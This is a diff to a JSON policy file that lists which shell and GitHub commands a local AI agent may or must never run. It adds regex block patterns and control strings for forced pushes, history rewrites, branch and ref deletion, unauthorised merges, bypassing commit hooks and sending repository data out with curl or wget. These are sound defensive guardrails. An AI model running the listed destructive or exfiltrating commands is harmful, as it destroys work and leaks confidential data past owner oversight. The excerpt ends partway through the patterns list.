@@ -1,8 +1,8 @@
 {
-  "$comment": "Machine twin of scripts/mac/local-brain/CAPABILITIES.md: what the Mac's local brain may run, may run only under conditions, must leave to a cloud model, and must never run. The Markdown tables are generated from this file by node scripts/check-local-brain-capabilities.mjs --write, and the same script gates both. Every path:line citation, in a row's source or in the prose of the Markdown, has an entry in anchors: text the gate asserts is inside the cited lines of the checked-out head, so a line moved by an edit above it turns the gate red. measuredAt names the commit the cited lines were last re-read in full; the anchors, not that commit, are what the gate checks. If this file and the tree disagree, the tree wins: raise a hand.",
+  "$comment": "Machine twin of scripts/mac/local-brain/CAPABILITIES.md: what the Mac's local brain may run, may run only under conditions, must leave to a cloud model, and must never run. The Markdown tables are generated from this file by node scripts/check-local-brain-capabilities.mjs --write, and the same script gates both. Every path:line or path:from-to citation, in a row's source or in the prose of the Markdown, has an entry in anchors: text the gate asserts sits on the first cited line (and, for a range, the last cited line) of the checked-out head and on no other line of that file, so a line inserted or removed at or above the end of a cited range turns the gate red. measuredAt names the commit the cited lines were last re-read in full (a commit of the branch that added this file: after a squash landing it is gone from the history, and the anchors, not that commit, are what the gate checks). If this file and the tree disagree, the tree wins: raise a hand.",
   "schemaVersion": 1,
   "measuredAt": {
-    "commit": "0d2592f78b4150fed445adcf57d7e07d67121df1",
+    "commit": "b317c393d8767c45d61a8c58259d26827a1ddb1e",
     "date": "2026-10-23"
   },
   "contract": "scripts/mac/local-brain/CAPABILITIES.md",
@@ -16,13 +16,13 @@
     "macOnly": "Refuses off macOS, or works only on macOS by construction.",
     "cloudModelNeeded": "Needs Claude or Codex, or a Claude session, to run.",
     "policy": "allowed: run any cycle. own-worktree: run only in your own worktree. own-worktree-host-lock: also hold the host verification lock. owner-grant: run only after the owner grants it in a registry row (a remote write, or a seam only the owner can connect). cloud-model: your floor; it needs Claude or Codex, so wait for credits. forbidden: never.",
-    "exists": "What the gate checks to prove the command exists: a package.json script, a tracked file, or an export of that file. The command text must name it: pnpm run X is the packageScript X (or starts with the packageScriptPrefix), node, bash or sh P and ./P are the file P, and an import or workflow row's command contains the file. null for git, GitHub, role and pattern rows.",
+    "exists": "What the gate checks to prove the command exists: a package.json script, a tracked file, or an export of that file. The command text must name it. On a line of several programs (a chain, a pipe, a subshell, $( )) the first pnpm run X is the packageScript X (or starts with the packageScriptPrefix) and the first node, bash or sh P or ./P is the file P; every further script or file on the line exists too; a program the gate cannot check needs exists null and a note. An import or workflow row's command contains the file. null for git, GitHub, role and pattern rows.",
     "selfTest": "A command that must equal a step that preflight or the breadth lane lists, or a workflow run: line. null when no lane runs one.",
-    "source": "path or path:line or path:from-to. The gate checks the path is tracked and, for a line citation, that the lines are inside the file and hold the citation's anchor.",
+    "source": "path or path:line or path:from-to. The gate checks the path is tracked and, for a line citation, that the lines are inside the file and that the citation's anchors sit on its first and last line.",
     "commandPatterns": "forbidden rows only: JavaScript regular-expression sources (no flags) tested against a shell command line. A match means: do not run it.",
     "pathPatterns": "forbidden rows only: regular-expression sources tested against a repo-relative file path you would change. A match means: do not change it.",
     "controls": "forbidden rows only: for each target with patterns, mustMatch lines (each must match a pattern of that row) and mustNotMatch lines (none may match). Asserted on every gate run.",
-    "anchors": "citation -> one line of text, 12 to 200 characters, that must appear inside the cited lines at the checked-out head. Every path:line citation in a row's source or in the Markdown prose needs one, and an anchor that no citation uses is a problem."
+    "anchors": "citation -> its anchors. path:line takes one text; path:from-to takes { first, last }. Each text is one line of 12 to 200 characters that appears on exactly one line of the file: the cited line for a single line and for first, the last cited line for last. Every path:line or path:from-to citation in a row's source or in the Markdown prose needs an entry, and an anchor that no citation uses is a problem."
   },
   "commands": [
     {
@@ -291,7 +291,7 @@
       "note": "",
       "source": [
         "scripts/raised-hands.mjs:6",
-        "scripts/raised-hands.mjs:790-797",
+        "scripts/raised-hands.mjs:790-795",
         "docs/agent/WORKER_BRIEF.md:38-44"
       ]
     },
@@ -363,7 +363,7 @@
       "note": "Executed 2026-10-22: scripts/mac/local-brain/CAPABILITIES.md -> owner-gated, SAFETY_MACHINERY, rule scripts/**; docs/LANE_COORDINATION.md, docs/agent/ORG.md, docs/agent/RESOURCE_INTAKE.md -> autonomous.",
       "source": [
         "scripts/check-owner-gated-surfaces.mjs:119-129",
-        "scripts/check-owner-gated-surfaces.mjs:318-323",
+        "scripts/check-owner-gated-surfaces.mjs:319-323",
         "scripts/check-owner-gated-surfaces.mjs:43"
       ]
     },
@@ -412,7 +412,7 @@
       },
       "note": "",
       "source": [
-        "scripts/agent/absence-check.mjs:3-9",
+        "scripts/agent/absence-check.mjs:3-8",
         "package.json:232"
       ]
     },
@@ -558,7 +558,7 @@
       },
       "note": "",
       "source": [
-        "scripts/mac/local-brain/job-state.mjs:26-35",
+        "scripts/mac/local-brain/job-state.mjs:26-34",
         "scripts/preflight.mjs:110-112"
       ]
     },
@@ -606,7 +606,7 @@
       },
       "note": "",
       "source": [
-        "scripts/mac/local-brain/proof-policy.mjs:42-61",
+        "scripts/mac/local-brain/proof-policy.mjs:42-60",
         "scripts/preflight.mjs:110-112"
       ]
     },
@@ -749,8 +749,8 @@
       },
       "note": "",
       "source": [
-        "scripts/mac/install-launchd.sh:33-36",
-        "scripts/mac/install-launchd.sh:45-47"
+        "scripts/mac/install-launchd.sh:33-34",
+        "scripts/mac/install-launchd.sh:46-47"
       ]
     },
     {
@@ -773,8 +773,8 @@
       },
       "note": "",
       "source": [
-        "scripts/mac/install-build-tick.sh:4-10",
-        "scripts/mac/install-build-tick.sh:39-41"
+        "scripts/mac/install-build-tick.sh:4-9",
+        "scripts/mac/install-build-tick.sh:39-40"
       ]
     },
     {
@@ -797,7 +797,7 @@
       },
       "note": "Needs `claude` on PATH unless SG_STAGE_RUNNER is set; reads open PRs through gh.",
       "source": [
-        "scripts/mac/build-tick.sh:390-393"
+        "scripts/mac/build-tick.sh:390-392"
       ]
     },
     {
@@ -843,7 +843,7 @@
       },
       "note": "",
       "source": [
-        "scripts/preflight.mjs:808-812"
+        "scripts/preflight.mjs:808-811"
       ]
     },
     {
@@ -939,7 +939,7 @@
       "source": [
         "CLAUDE.md:68-74",
         "docs/agent/WORKER_BRIEF.md:58-62",
-        "scripts/mac/host-verification-lock.sh:9-22",
+        "scripts/mac/host-verification-lock.sh:9-20",
         "scripts/mac/lane-tick.sh:296",
         "scripts/preflight.mjs:46-58"
       ]
@@ -966,7 +966,7 @@
       "note": "Run only in your own worktree at the commit you will propose, while holding the host verification lock taken through mainline's scripts/mac/host-verification-lock.sh (sg_host_verify_acquire on $HOME/Library/Caches/signalgrid/host-verification.lock). Never two port-bound chains at once.",
       "source": [
         "CLAUDE.md:68-74",
-        "scripts/mac/host-verification-lock.sh:9-22",
+        "scripts/mac/host-verification-lock.sh:9-20",
         "scripts/mac/lane-tick.sh:296",
         "scripts/preflight.mjs:46-58"
       ]
@@ -1039,8 +1039,7 @@
       "note": "proof:connector-emulator rewrites the tracked artifacts/connector-emulator/results.json.",
       "source": [
         "CLAUDE.md:113-114",
-        "scripts/preflight.mjs:681",
-        "scripts/preflight.mjs:688"
+        "scripts/preflight.mjs:671-677"
       ]
     },
     {
@@ -1061,8 +1060,8 @@
       "exists": null,
       "note": "Run only in your own worktree at the commit you will propose, while holding the host verification lock taken through mainline's scripts/mac/host-verification-lock.sh (sg_host_verify_acquire on $HOME/Library/Caches/signalgrid/host-verification.lock). Never two port-bound chains at once.",
       "source": [
-        "CLAUDE.md:107-112",
-        "scripts/mac/host-verification-lock.sh:9-22",
+        "CLAUDE.md:107-111",
+        "scripts/mac/host-verification-lock.sh:9-20",
         "scripts/mac/lane-tick.sh:296",
         "scripts/preflight.mjs:46-58"
       ]
@@ -1088,7 +1087,7 @@
       "note": "Rewrites package.json and pnpm-lock.yaml and restores them; a killed run leaves them modified. Run only in your own worktree at the commit you will propose, while holding the host verification lock taken through mainline's scripts/mac/host-verification-lock.sh (sg_host_verify_acquire on $HOME/Library/Caches/signalgrid/host-verification.lock). Never two port-bound chains at once.",
       "source": [
         "validate-sim-macos.sh:109-111",
-        "CLAUDE.md:44-56"
+        "CLAUDE.md:44-54"
       ]
     },
     {
@@ -1160,7 +1159,7 @@
       },
       "note": "Appends to the TRACKED artifacts/build-loop/history.jsonl on every run; never commit that file unless the task is the loop itself.",
       "source": [
-        "scripts/build-loop.mjs:144-152"
+        "scripts/build-loop.mjs:144-151"
       ]
     },
     {
@@ -1184,7 +1183,7 @@
       },
       "note": "",
       "source": [
-        "scripts/raise-hand.mjs:6-13",
+        "scripts/raise-hand.mjs:6-12",
         "scripts/raise-hand.mjs:83-123",
         "CLAUDE.md:264"
       ]
@@ -1404,7 +1403,7 @@
       },
       "note": "The ack records ackedBy mac; the Mac lane session cannot tell it from its own. Ack only mail your own work answered.",
       "source": [
-        "scripts/lane-message.mjs:279-295"
+        "scripts/lane-message.mjs:280-295"
       ]
     },
     {
@@ -1518,7 +1517,7 @@
       },
       "note": "",
       "source": [
-        ".claude/workflows/land-branch.js:1-45"
+        ".claude/workflows/land-branch.js:1-44"
       ]
     },
     {
@@ -1544,8 +1543,8 @@
         "scripts/mac/build-tick-stages.mjs:191-199",
         "scripts/mac/build-tick-stages.mjs:222-258",
         "docs/LANE_COORDINATION.md:76-86",
-        "docs/agent/scheduled-routines.json:92-93",
-        "docs/agent/scheduled-routines.json:101-102"
+        "docs/agent/scheduled-routines.json:91-93",
+        "docs/agent/scheduled-routines.json:100-102"
       ]
     },
     {
@@ -1575,7 +1574,7 @@
     {
       "name": "merge",
       "kind": "pattern",
-      "command": "any merge of a pull request or push to SignalGrid_Alpha that lands code: gh api -X PUT .../pulls/<n>/merge, a merge_pull_request tool, enabling auto-merge, git push origin HEAD:SignalGrid_Alpha",
+      "command": "any merge of a pull request or push to SignalGrid_Alpha that lands code: gh api -X PUT .../pulls/<n>/merge, a merge_pull_request tool (also by its mcp__github__ name), enabling auto-merge, git push origin HEAD:SignalGrid_Alpha (also git -C <dir> push, a push_files or create_or_update_file tool on that branch, an API update of its ref)",
       "does": "Agents never merge their own work; a local model's advice grants no writer or merge authority.",
       "policy": "forbidden",
       "readOnly": false,
@@ -1597,12 +1596,14 @@
       ],
       "commandPatterns": [
         "\\bgh\\s+pr\\s+merge\\b",
-        "/pulls/\\d+/merge\\b",
-        "\\bmerge_pull_request\\b",
-        "\\benable_pr_auto_merge\\b",
-        "\\bgit\\s+push\\b[^\\n]*\\bSignalGrid_Alpha\\b",
+        "/pulls/[^\\s/]+/merge\\b",
+        "merge_pull_request\\b",
+        "enable_pr_auto_merge\\b",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+push\\b[^\\n]*\\bSignalGrid_Alpha\\b",
         "\\brepos/[^\\s/]+/[^\\s/]+/merges\\b",
-        "\\b(enablePullRequestAutoMerge|mergePullRequest)\\b"
+        "\\b(enablePullRequestAutoMerge|mergePullRequest)\\b",
+        "\\bgh\\s+api\\b(?=[^\\n]*\\s(?:-X\\s*|--method[\\s=]+)(?:PATCH|PUT|POST|patch|put|post)\\b)[^\\n]*\\bgit/refs/heads/SignalGrid_Alpha\\b",
+        "(?:push_files|create_or_update_file|delete_file)\\b[^\\n]*\\bbranch[\"']?\\s*[=:]\\s*[\"']?SignalGrid_Alpha\\b"
       ],
       "pathPatterns": [],
       "controls": {
@@ -1620,7 +1621,19 @@
             "git push origin \"HEAD:SignalGrid_Alpha\"",
             "gh api -X POST repos/DanFashauer/SignalGrid-Review-Hub/merges -f base=SignalGrid_Alpha -f head=mac/local-brain-x",
             "gh api graphql -f query='mutation { enablePullRequestAutoMerge(input: {pullRequestId: \"x\"}) { clientMutationId } }'",
-            "gh api graphql -f query='mutation { mergePullRequest(input: {pullRequestId: \"x\"}) { clientMutationId } }'"
+            "gh api graphql -f query='mutation { mergePullRequest(input: {pullRequestId: \"x\"}) { clientMutationId } }'",
+            "git -C /tmp/sg-brain push origin HEAD:SignalGrid_Alpha",
+            "git --git-dir=/tmp/w/repo.d push origin HEAD:SignalGrid_Alpha",
+            "git -C \"/tmp/sg brain\" push origin SignalGrid_Alpha",
+            "mcp__github__merge_pull_request owner=o repo=r pullNumber=1",
+            "mcp__github__enable_pr_auto_merge owner=o repo=r pullNumber=1",
+            "gh pr merge --auto --squash 1600",
+            "gh api -X PUT repos/DanFashauer/SignalGrid-Review-Hub/pulls/<n>/merge",
+            "gh api -X PUT repos/DanFashauer/SignalGrid-Review-Hub/pulls/$PR/merge",
+            "gh api -X PATCH repos/DanFashauer/SignalGrid-Review-Hub/git/refs/heads/SignalGrid_Alpha -f sha=0123abc",
+            "gh api repos/DanFashauer/SignalGrid-Review-Hub/git/refs/heads/SignalGrid_Alpha -X PATCH -F force=true -f sha=0123abc",
+            "mcp__github__push_files owner=o repo=r branch=SignalGrid_Alpha",
+            "mcp__github__create_or_update_file owner=o repo=r path=x branch=SignalGrid_Alpha"
           ],
           "mustNotMatch": [
             "git push origin HEAD:refs/heads/mac/local-brain-gate-20261023",
@@ -1628,7 +1641,12 @@
             "git merge-base --is-ancestor HEAD origin/SignalGrid_Alpha",
             "pnpm run lane:deliver send \"subject\" \"body\"",
             "git log origin/SignalGrid_Alpha..HEAD --oneline",
-            "gh api repos/DanFashauer/SignalGrid-Review-Hub/pulls/1600"
+            "gh api repos/DanFashauer/SignalGrid-Review-Hub/pulls/1600",
+            "git -C /tmp/sg-brain push origin HEAD:refs/heads/mac/local-brain-gate-20261023",
+            "git -C /tmp/sg-brain log origin/SignalGrid_Alpha..HEAD --oneline",
+            "gh api repos/DanFashauer/SignalGrid-Review-Hub/git/refs/heads/SignalGrid_Alpha",
+            "mcp__github__create_branch owner=o repo=r branch=mac/local-brain-x from_branch=SignalGrid_Alpha",
+            "mcp__github__get_file_contents owner=o repo=r path=x ref=SignalGrid_Alpha"
           ]
         }
       }
@@ -1698,8 +1716,7 @@
       ],
       "commandPatterns": [
         "\\bgh\\s+(pr|issue)\\s+close\\b",
-        "(-f|-F|--field|--raw-field)\\s+state=(closed|CLOSED)\\b",
-        "\"state\"\\s*:\\s*\"(closed|CLOSED)\"",
+        "(?:^|[\\s\"'=])state[\"']?\\s*[=:]\\s*[\"']?(?:closed|CLOSED)\\b",
         "\\b(closePullRequest|closeIssue)\\b"
       ],
       "pathPatterns": [],
@@ -1713,13 +1730,21 @@
             "gh api graphql -f query='mutation { closePullRequest(input: {pullRequestId: \"x\"}) { clientMutationId } }'",
             "gh api graphql -f query='mutation { closeIssue(input: {issueId: \"x\"}) { clientMutationId } }'",
             "gh api -X PATCH repos/o/r/pulls/439 -f state=CLOSED",
-            "gh api -X PATCH repos/o/r/issues/1597 --input - <<< '{\"state\": \"CLOSED\"}'"
+            "gh api -X PATCH repos/o/r/issues/1597 --input - <<< '{\"state\": \"CLOSED\"}'",
+            "gh api -X PATCH repos/o/r/pulls/439 -f 'state=closed'",
+            "gh api -X PATCH repos/o/r/pulls/439 -f state=\"closed\"",
+            "gh api -X PATCH repos/o/r/pulls/439 --field=state=closed",
+            "mcp__github__update_pull_request owner=o repo=r pullNumber=439 state=closed",
+            "mcp__github__issue_write method=update owner=o repo=r issue_number=1597 state=closed"
           ],
           "mustNotMatch": [
             "gh api 'repos/o/r/issues?state=closed&per_page=100'",
             "gh api repos/o/r/pulls/439",
             "gh api -X PATCH repos/o/r/pulls/439 -f title=x",
-            "gh api graphql -f query='query { repository(owner: \"o\", name: \"r\") { pullRequests(states: OPEN, first: 5) { totalCount } } }'"
+            "gh api graphql -f query='query { repository(owner: \"o\", name: \"r\") { pullRequests(states: OPEN, first: 5) { totalCount } } }'",
+            "gh api 'repos/o/r/pulls?state=closed&per_page=100'",
+            "gh issue list --state closed",
+            "gh pr view 439"
           ]
         }
       }
@@ -1727,7 +1752,7 @@
     {
       "name": "delete",
       "kind": "pattern",
-      "command": "pnpm run branches:clean; APPLY=true node scripts/prune-merged-branches.mjs; git push origin --delete <ref> or :<ref>; git branch -D or -d (any); deleting files under artifacts/raised-hands or artifacts/lane-messages; a DELETE call to the GitHub API; rm -rf outside your own worktree",
+      "command": "pnpm run branches:clean; APPLY=true node scripts/prune-merged-branches.mjs; bash scripts/cleanup-merged-branches.sh --apply; git push origin --delete <ref> or :<ref> or --prune; git branch -D or -d (any, also -df, also under git -C <dir>); git update-ref -d; deleting or moving files under artifacts/raised-hands or artifacts/lane-messages; a DELETE call to the GitHub API (also gh issue delete and the like, a GraphQL delete mutation, a delete_file tool); rm -rf outside your own worktree",
       "does": "Branch deletion and other destructive git are the owner's to approve.",
       "policy": "forbidden",
       "readOnly": false,
@@ -1744,16 +1769,21 @@
       "source": [
         "CLAUDE.md:245-249",
         "docs/DECISION_RECORDS.md:2261",
-        "scripts/cleanup-merged-branches.sh:1-6",
+        "scripts/cleanup-merged-branches.sh:1-5",
         "scripts/prune-merged-branches.mjs:5-6"
       ],
       "commandPatterns": [
-        "\\bgit\\s+push\\b[^\\n]*(\\s--delete\\b|\\s-d\\b|\\s:[\\w./-]+)",
-        "\\bgit\\s+branch\\b[^\\n]*\\s(-D|-d|--delete)\\b",
-        "\\bpnpm\\s+run\\s+branches:clean\\b",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+push\\b[^\\n]*(\\s--delete\\b|\\s-d\\b|\\s--prune\\b|\\s:[\\w./-]+)",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+branch\\b[^\\n]*\\s(--delete\\b|-[A-Za-z]*[dD][A-Za-z]*(?=\\s|$))",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+update-ref\\b[^\\n]*\\s-d\\b",
+        "\\b(?:pnpm|npm|yarn)\\s+(?:run\\s+)?branches:clean\\b",
         "\\bAPPLY=true\\b[^\\n]*prune-merged-branches",
-        "\\b(rm|git\\s+rm|unlink)\\b[^\\n]*artifacts/(raised-hands|lane-messages)\\b",
+        "\\bcleanup-merged-branches\\.sh\\b[^\\n]*\\s--apply\\b",
+        "\\b(rm|unlink|mv|shred)\\b[^\\n]*artifacts/(raised-hands|lane-messages)\\b",
         "\\bgh\\s+api\\b[^\\n]*(-X\\s*|--method[\\s=]+)(DELETE|delete)\\b",
+        "\\bgh\\s+[a-z-]+\\s+(?:delete|remove)\\b",
+        "\\bdelete[A-Z][A-Za-z]*\\s*\\(",
+        "delete_file\\b",
         "\\bfind\\b[^\\n]*artifacts/(raised-hands|lane-messages)\\b[^\\n]*-delete\\b",
         "\\bcurl\\b[^\\n]*(-X\\s*|--request[\\s=]+)(DELETE|delete)\\b"
       ],
@@ -1773,7 +1803,20 @@
             "gh api --method DELETE repos/o/r/git/refs/heads/x",
             "gh api -XDELETE repos/o/r/git/refs/heads/x",
             "gh api --method=DELETE repos/o/r/git/refs/heads/x",
-            "curl -X DELETE -H \"Authorization: Bearer $T\" https://api.github.com/repos/o/r/git/refs/heads/x"
+            "curl -X DELETE -H \"Authorization: Bearer $T\" https://api.github.com/repos/o/r/git/refs/heads/x",
+            "git -C /tmp/sg-brain branch -D mac/x",
+            "git branch -df mac/x",
+            "git --git-dir=/tmp/w/repo.d push origin --delete mac/x",
+            "git push --prune origin refs/heads/*:refs/heads/*",
+            "git update-ref -d refs/heads/mac/x",
+            "git -C /tmp/sg-brain update-ref -d refs/heads/mac/x",
+            "pnpm branches:clean",
+            "bash scripts/cleanup-merged-branches.sh --apply",
+            "mv artifacts/raised-hands/2026-10-22-x.json /tmp/",
+            "gh issue delete 1597 --yes",
+            "gh release delete v1 --yes",
+            "gh api graphql -f query='mutation { deleteRef(input: {refId: \"x\"}) { clientMutationId } }'",
+            "mcp__github__delete_file owner=o repo=r path=x branch=mac/x"
           ],
           "mustNotMatch": [
             "git push origin HEAD:refs/heads/mac/local-brain-x",
@@ -1782,7 +1825,15 @@
             "rm -rf /tmp/sg-brain-scratch",
             "node scripts/raise-hand.mjs --list",
             "ls artifacts/lane-messages",
-            "gh api repos/o/r/git/refs/heads/x"
+            "gh api repos/o/r/git/refs/heads/x",
+            "git -C /tmp/sg-brain push origin HEAD:refs/heads/mac/local-brain-x",
+            "git -C /tmp/sg-brain branch --list 'mac/*'",
+            "git branch -vv",
+            "git branch --show-current",
+            "git update-ref refs/heads/mac/x HEAD",
+            "bash scripts/cleanup-merged-branches.sh",
+            "gh issue list --state open",
+            "gh api graphql -f query='query { viewer { login } }'"
           ]
         }
       }
@@ -1790,7 +1841,7 @@
     {
       "name": "force-push",
       "kind": "pattern",
-      "command": "git push --force / --force-with-lease / -f / a +refspec; git rebase (any); git reset --hard (any); git filter-branch or filter-repo",
+      "command": "git push --force / --force-with-lease / -f (also in a cluster such as -fu) / --mirror / a +refspec; git rebase (any); git reset --hard (any); git filter-branch or filter-repo; git pull --rebase; each also under git -C <dir> and the other global options",
       "does": "Never force-push or rewrite history.",
       "policy": "forbidden",
       "readOnly": false,
@@ -1809,12 +1860,11 @@
         "docs/agent/WORKER_BRIEF.md:88-89"
       ],
       "commandPatterns": [
-        "\\bgit\\s+push\\b[^\\n]*(\\s--force(-with-lease)?\\b|\\s-f\\b|\\s\\+[\\w./-]+)",
-        "\\bgit\\s+rebase\\b",
-        "\\bgit\\s+reset\\s+--hard\\b",
-        "\\bgit\\s+filter-(branch|repo)\\b",
-        "\\bgit\\s+pull\\b[^\\n]*\\s(--rebase|-r)\\b",
-        "\\bgit\\s+(-c\\s+\\S+\\s+)+rebase\\b"
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+push\\b[^\\n]*(\\s--force(?:-with-lease|-if-includes)?\\b|\\s-[A-Za-z]*f[A-Za-z]*(?=\\s|$)|\\s--mirror\\b|\\s\\+[\\w./:-]+)",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+rebase\\b",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+reset\\b[^\\n]*\\s--hard\\b",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+filter-(?:branch|repo)\\b",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+pull\\b[^\\n]*\\s(--rebase|-r)\\b"
       ],
       "pathPatterns": [],
       "controls": {
@@ -1829,14 +1879,27 @@
             "git filter-repo --path secrets.txt --invert-paths",
             "git pull --rebase origin SignalGrid_Alpha",
             "git pull -r origin SignalGrid_Alpha",
-            "git -c rebase.autoStash=true rebase origin/SignalGrid_Alpha"
+            "git -c rebase.autoStash=true rebase origin/SignalGrid_Alpha",
+            "git -C /tmp/sg-brain push --force origin HEAD:refs/heads/mac/local-brain-x",
+            "git -C /tmp/sg-brain reset --hard origin/SignalGrid_Alpha",
+            "git -C /tmp/sg-brain rebase origin/SignalGrid_Alpha",
+            "git --git-dir=/tmp/w/repo.d filter-branch --all",
+            "git push --mirror origin",
+            "git push -fu origin mac/local-brain-x",
+            "git push origin +:mac/old-branch",
+            "git push --force-if-includes origin mac/local-brain-x",
+            "git -C /tmp/sg-brain pull --rebase origin SignalGrid_Alpha"
           ],
           "mustNotMatch": [
             "git push origin HEAD:refs/heads/mac/local-brain-x",
             "git worktree add --detach /tmp/sg-brain 0123abc",
             "git worktree remove --force /tmp/sg-brain",
             "git reset --soft HEAD~1",
-            "git pull --ff-only origin SignalGrid_Alpha"
+            "git pull --ff-only origin SignalGrid_Alpha",
+            "git -C /tmp/sg-brain push origin HEAD:refs/heads/mac/local-brain-x",
+            "git push -u origin HEAD:refs/heads/mac/local-brain-x",
+            "git -C /tmp/sg-brain reset --soft HEAD~1",
+            "git -C /tmp/sg-brain pull --ff-only origin SignalGrid_Alpha"
           ]
         }
       }
@@ -1862,16 +1925,16 @@
         "CLAUDE.md:262",
         "scripts/lane-deliver.mjs:16-17",
         "scripts/check-ci-liveness.mjs:110",
-        "scripts/mac/build-tick.sh:395-404"
+        "scripts/mac/build-tick.sh:395-403"
       ],
       "commandPatterns": [
         "--no-verify\\b",
         "\\bcore\\.hooksPath\\b",
         "--allow-ungated\\b",
-        "\\bgit\\s+stash\\b",
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+stash\\b",
         "(^|\\s)(CI|GITHUB_ACTIONS)=",
         "\\b(rm|unlink|mv)\\b[^\\n]*(signalgrid/build-tick/paused|\\$PAUSED)\\b",
-        "\\bgit\\s+commit\\b[^\\n]*\\s-[A-Za-z]*n[A-Za-z]*(?=\\s|$)"
+        "\\bgit(?:\\s+(?:-[Cc]\\s+(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:git-dir|work-tree|namespace)(?:=|\\s+)(?:\"[^\"]*\"|'[^']*'|\\S+)|--(?:no-pager|paginate|bare|no-optional-locks|literal-pathspecs)|-[pP]))*\\s+commit\\b[^\\n]*\\s-[A-Za-z]*n[A-Za-z]*(?=\\s|$)"
       ],
       "pathPatterns": [],
       "controls": {
@@ -1886,7 +1949,12 @@
             "GITHUB_ACTIONS=true node scripts/check-ci-liveness.mjs",
             "rm \"$HOME/Library/Caches/signalgrid/build-tick/paused\"",
             "git commit -n -m x",
-            "git commit -anm x"
+            "git commit -anm x",
+            "git -C /tmp/sg-brain stash",
+            "git -C /tmp/sg-brain commit -n -m x",
+            "git -C \"/tmp/sg brain\" commit -anm x",
+            "git --no-pager stash list",
+            "export CI=true"
           ],
           "mustNotMatch": [
             "git commit -m \"local-brain: add gate\"",
@@ -1894,7 +1962,8 @@
             "pnpm run lane:deliver send \"s\" \"b\" --dry-run",
             "node scripts/check-ci-liveness.mjs",
             "git commit --amend --no-edit",
-            "git commit -am \"local-brain: tighten the gate\""
+            "git commit -am \"local-brain: tighten the gate\"",
+            "git -C /tmp/sg-brain commit -m \"local-brain: add gate\""
           ]
         }
       }
@@ -1902,7 +1971,7 @@
     {
       "name": "send-outside",
       "kind": "pattern",
-      "command": "uploading, quoting or embedding anything under reference/knowledge; sending repository content to any remote service other than the owner's own Claude or Codex escalation; posting PR comments, issues, email or chat in the owner's name",
+      "command": "uploading, quoting or embedding anything under reference/knowledge; sending repository content to any remote service other than the owner's own Claude or Codex escalation (curl or wget with data, scp, rsync to a host, a mail program); posting PR comments, issues, email or chat in the owner's name (gh pr comment, gh issue create or comment, gh gist create, gh api with fields to a comments or issues endpoint, the GitHub and mail tools that post)",
       "does": "The corpus is confidential; sending data to an external service needs the owner.",
       "policy": "forbidden",
       "readOnly": false,
@@ -1919,12 +1988,22 @@
       "source": [
         "scripts/mac/sg-brain-link.sh:12-18",
         "CLAUDE.md:245-249",
-        "docs/agent/RESOURCE_INTAKE.md:72-74"
+        "docs/agent/RESOURCE_INTAKE.md:72-73"
       ],
       "commandPatterns": [
         "(^|[\\s\"'=/])reference/knowledge\\b",
         "\\bcurl\\b[^\\n]*\\s(-d|--data(-ascii|-binary|-raw|-urlencode)?|--json|-F|--form|-T|--upload-file)\\b",
-        "\\bwget\\b[^\\n]*\\s--(post-file|post-data|body-file|body-data)\\b"
+        "\\bcurl\\b[^\\n]*(-X\\s*|--request[\\s=]+)(POST|PUT|PATCH|post|put|patch)\\b",
+        "\\bwget\\b[^\\n]*\\s--(post-file|post-data|body-file|body-data)\\b",
+        "\\bgh\\s+(?:pr\\s+(?:comment|review)|issue\\s+(?:comment|create|edit))\\b",
+        "\\bgh\\s+gist\\s+create\\b",
+        "\\bgh\\s+api\\b[^\\n]*/(?:comments|issues|reviews)\\b[^\\n]*\\s(?:-f|-F|--field|--raw-field|--input)\\b",
